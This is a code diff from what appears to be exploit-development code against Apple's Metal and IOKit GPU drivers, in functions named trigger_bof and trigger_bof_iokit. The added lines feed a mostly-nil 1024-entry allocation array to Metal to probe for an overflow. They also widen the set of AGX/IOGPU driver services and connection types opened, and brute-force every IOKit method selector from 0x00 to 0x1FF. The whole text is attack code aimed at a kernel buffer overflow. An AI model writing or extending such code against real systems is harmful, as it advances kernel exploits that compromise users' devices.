@@ -165,6 +165,19 @@ static void trigger_bof(id<MTLDevice> dev) {
         evf("Metal API path baseline confirmed (count=4 OK)");
         evf("Metal overflow requires raw IOKit path (Metal iterates arr pre-kernel)");
 
+        /* Test: nil-filled heap array — Metal nil-messaging returns 0 GPU addr */
+        /* calloc gives zeroed memory so arr[4..N-1] are nil (ObjC messages to nil = 0) */
+        #define NIL_TEST_COUNT 1024
+        id<MTLAllocation> *nil_arr = (id<MTLAllocation>*)calloc(NIL_TEST_COUNT, sizeof(id));
+        if (nil_arr) {
+            for (int i = 0; i < 4 && i < (int)resources.count; i++)
+                nil_arr[i] = (id<MTLAllocation>)resources[i];
+            /* Test Metal nil handling: count=NIL_TEST_COUNT, only 4 real, rest nil */
+            [rset addAllocations:nil_arr count:NIL_TEST_COUNT];
+            evf("nil_arr count=%d: Metal handled nil allocations (no crash)", NIL_TEST_COUNT);
+            free(nil_arr);
+        }
+
     fallback_path:;
         /* Alternate trigger: MTLRenderCommandEncoder useResources */
         MTLRenderPassDescriptor *rpd = [MTLRenderPassDescriptor renderPassDescriptor];
@@ -233,10 +246,11 @@ static void trigger_bof_iokit(void) {
     evf("IOKIT PROBE: full scan start");
 
     const char *svc_names[] = {
-        "IOGPU", "IOGPUDevice", "AGXG18P", "AGXG18X", "AGXSolo", "IOGPUFamily", NULL
+        "IOGPU", "AGXAcceleratorG18P", "AGXAccelerator", "AGXG18P",
+        "IOGPUDevice", "IOAccelerator", "AGXSolo", NULL
     };
-    const uint32_t ctypes[] = { 0, 1, 2, 3, 0x100, 0x101 };
-    const int N_CTYPES = 6;
+    const uint32_t ctypes[] = { 0, 1, 2, 3, 4, 5, 6, 7 };
+    const int N_CTYPES = 8;
 
     typedef struct { const char *svc; uint32_t ctype; io_connect_t conn; } CEntry;
     CEntry conns[36];
@@ -274,7 +288,7 @@ static void trigger_bof_iokit(void) {
         uint8_t st_out[64] = {0};
         size_t st_out_sz = sizeof(st_out);
 
-        for (uint32_t sel = 0x170; sel <= 0x1C0; sel++) {
+        for (uint32_t sel = 0x00; sel <= 0x1FF; sel++) {
             sc_cnt = 4; st_out_sz = sizeof(st_out);
             kern_return_t kr = IOConnectCallMethod(conn, sel,
                 NULL, 0, st_in, sizeof(st_in),
